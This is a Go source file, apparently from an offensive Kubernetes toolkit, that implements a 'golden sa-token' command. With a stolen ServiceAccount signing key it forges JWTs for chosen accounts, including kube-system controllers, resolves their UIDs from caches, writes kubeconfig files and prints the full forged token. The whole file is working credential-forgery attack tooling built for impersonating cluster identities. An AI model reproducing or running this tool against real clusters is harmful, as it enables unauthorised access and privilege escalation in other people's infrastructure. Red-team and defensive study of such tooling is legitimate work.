package golden

import (
	"fmt"
	"strings"

	"kctl/config"
	"kctl/internal/golden"
	"kctl/internal/session"
	"kctl/pkg/types"
)

// SATokenCmd sa-token 子命令
type SATokenCmd struct{}

func init() {
	Register(&SATokenCmd{})
}

func (c *SATokenCmd) Name() string        { return "sa-token" }
func (c *SATokenCmd) Aliases() []string   { return []string{"sat", "token"} }
func (c *SATokenCmd) Description() string { return "伪造 ServiceAccount Token" }

func (c *SATokenCmd) Usage() string {
	return `golden sa-token [选项]

伪造 ServiceAccount Token (JWT)

必需选项:
  --sa-key, -s      SA 私钥路径
  --namespace       ServiceAccount 命名空间
  --name            ServiceAccount 名称

UID 选项 (三选一，优先级: --uid > --uid-cache > 内存缓存):
  --uid             直接指定 ServiceAccount UID
  --uid-cache       从 UID 缓存文件查找
  (无参数)          自动从内存缓存查找 (需先执行 golden update-uid)

可选选项:
  --ttl             Token 有效期秒数 (默认: 3600)
  --audience        Token 受众 URL (默认: https://kubernetes.default.svc.cluster.local)
  --server          API Server URL (默认: session 中的 api-server)
  --ca-cert, -c     CA 证书路径 (用于 kubeconfig)
  --output, -o      输出目录 (默认: 当前目录)
  --no-kubeconfig   不生成 kubeconfig 文件
  --force           覆盖已存在的文件

示例:
  golden sa-token -s ./sa.key --namespace kube-system --name controller --uid xxx
  golden sa-token -s ./sa.key --namespace default --name mysa --uid-cache ./uid_cache.json
  golden sa-token -s ./sa.key --namespace kube-system --name controller  # 自动从内存查找 UID`
}

func (c *SATokenCmd) Execute(sess *session.Session, args []string) error {
	p := sess.Printer

	// 检查是否请求帮助
	for _, arg := range args {
		if arg == "--help" || arg == "-h" {
			p.Println(c.Usage())
			return nil
		}
	}

	// 解析参数
	opts, err := c.parseArgs(sess, args)
	if err != nil {
		return err
	}

	// 查找 UID (优先级: --uid > --uid-cache > 内存缓存)
	if opts.UID != "" {
		p.Printf("%s Using provided UID: %s\n", p.Colored(config.ColorGreen, "[+]"), opts.UID)
	} else if opts.UIDCachePath != "" {
		// 从文件缓存查找
		cache, err := golden.LoadUIDCache(opts.UIDCachePath)
		if err != nil {
			return fmt.Errorf("加载 UID 缓存失败: %w", err)
		}
		uid, err := golden.LookupUID(cache, opts.Namespace, opts.Name)
		if err != nil {
			return err
		}
		opts.UID = uid
		p.Printf("%s Found UID in file cache: %s\n", p.Colored(config.ColorGreen, "[+]"), uid)
	} else {
		// 从内存缓存查找
		if sess.UIDCache == nil || len(sess.UIDCache.Entries) == 0 {
			return fmt.Errorf("未指定 UID，且内存中没有 UID 缓存。\n" +
				"  请使用 --uid 直接指定，或\n" +
				"  使用 --uid-cache 指定缓存文件，或\n" +
				"  先执行 'golden update-uid' 获取 UID 缓存")
		}
		uid, err := golden.LookupUID(sess.UIDCache, opts.Namespace, opts.Name)
		if err != nil {
			return fmt.Errorf("在内存缓存中未找到 %s/%s 的 UID: %w", opts.Namespace, opts.Name, err)
		}
		opts.UID = uid
		p.Printf("%s Found UID in memory cache: %s\n", p.Colored(config.ColorGreen, "[+]"), uid)
	}

	// 伪造 Token
	p.Printf("%s Forging ServiceAccount token (TTL: %ds)...\n",
		p.Colored(config.ColorBlue, "[*]"), opts.TTL)

	result, err := golden.ForgeSAToken(opts)
	if err != nil {
		return fmt.Errorf("伪造 Token 失败: %w", err)
	}

	// 生成 kubeconfig (如果需要)
	if !opts.NoKubeconfig && opts.ServerURL != "" {
		kubeconfigPath := golden.GetSATokenOutputPath(opts.OutputDir, opts.Namespace, opts.Name)
		err := golden.GenerateKubeconfigFromToken(result, opts.CACertPath, opts.ServerURL, kubeconfigPath, opts.Force)
		if err != nil {
			p.Warning(fmt.Sprintf("生成 kubeconfig 失败: %v", err))
		} else {
			result.KubeconfigPath = kubeconfigPath
		}
	}

	// 输出结果
	c.printResult(p, result, opts)

	return nil
}

func (c *SATokenCmd) parseArgs(sess *session.Session, args []string) (*types.SATokenOptions, error) {
	opts := &types.SATokenOptions{
		TTL:       golden.DefaultTTL,
		Audience:  golden.DefaultAudience,
		ServerURL: BuildAPIServerURL(sess.Config.APIServer, sess.Config.APIServerPort),
	}

	for i := 0; i < len(args); i++ {
		arg := args[i]

		switch arg {
		case "--sa-key", "-s":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--sa-key 需要参数")
			}
			i++
			opts.SAKeyPath = args[i]

		case "--ca-cert", "-c":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--ca-cert 需要参数")
			}
			i++
			opts.CACertPath = args[i]

		case "--namespace":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--namespace 需要参数")
			}
			i++
			opts.Namespace = args[i]

		case "--name":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--name 需要参数")
			}
			i++
			opts.Name = args[i]

		case "--uid":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--uid 需要参数")
			}
			i++
			opts.UID = args[i]

		case "--uid-cache":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--uid-cache 需要参数")
			}
			i++
			opts.UIDCachePath = args[i]

		case "--ttl":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--ttl 需要参数")
			}
			i++
			var ttl int
			if _, err := fmt.Sscanf(args[i], "%d", &ttl); err != nil {
				return nil, fmt.Errorf("无效的 TTL 值: %s", args[i])
			}
			opts.TTL = ttl

		case "--audience":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--audience 需要参数")
			}
			i++
			opts.Audience = args[i]

		case "--server":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--server 需要参数")
			}
			i++
			opts.ServerURL = args[i]

		case "--output", "-o":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--output 需要参数")
			}
			i++
			opts.OutputDir = args[i]

		case "--no-kubeconfig":
			opts.NoKubeconfig = true

		case "--force":
			opts.Force = true

		default:
			if strings.HasPrefix(arg, "-") {
				return nil, fmt.Errorf("未知选项: %s", arg)
			}
		}
	}

	// 验证必需参数
	if opts.SAKeyPath == "" {
		return nil, fmt.Errorf("未指定 SA 私钥路径 (--sa-key)")
	}
	if opts.Namespace == "" {
		return nil, fmt.Errorf("未指定 namespace (--namespace)")
	}
	if opts.Name == "" {
		return nil, fmt.Errorf("未指定 name (--name)")
	}
	// UID 可以在 Execute 中从内存缓存查找，这里不强制要求

	// 验证文件
	if err := golden.ValidateSAKeyFile(opts.SAKeyPath); err != nil {
		return nil, err
	}

	return opts, nil
}

func (c *SATokenCmd) printResult(p interface {
	Printf(format string, a ...interface{})
	Println(a ...interface{})
	Colored(colorName config.ColorName, text string) string
}, result *types.ForgeResult, opts *types.SATokenOptions) {
	p.Println()
	p.Printf("%s Forged ServiceAccount token for %s/%s:\n",
		p.Colored(config.ColorGreen, "[+]"), opts.Namespace, opts.Name)
	p.Println()

	// 显示 Token (可能很长，截断显示)
	token := result.Token
	if len(token) > 100 {
		p.Printf("  Token: %s...\n", token[:100])
	} else {
		p.Printf("  Token: %s\n", token)
	}
	p.Println()

	// 显示完整 Token
	p.Printf("%s Full token:\n", p.Colored(config.ColorBlue, "[*]"))
	p.Println(token)
	p.Println()

	// 显示 kubeconfig 路径
	if result.KubeconfigPath != "" {
		p.Printf("%s Kubeconfig: %s\n", p.Colored(config.ColorGreen, "[+]"), result.KubeconfigPath)
		p.Printf("  Test with: kubectl --kubeconfig=%s auth whoami\n", result.KubeconfigPath)
	}

	// 显示过期时间
	p.Printf("%s Expires at: %s\n", p.Colored(config.ColorBlue, "[*]"), result.ExpiresAt.Format("2006-01-02 15:04:05"))
}
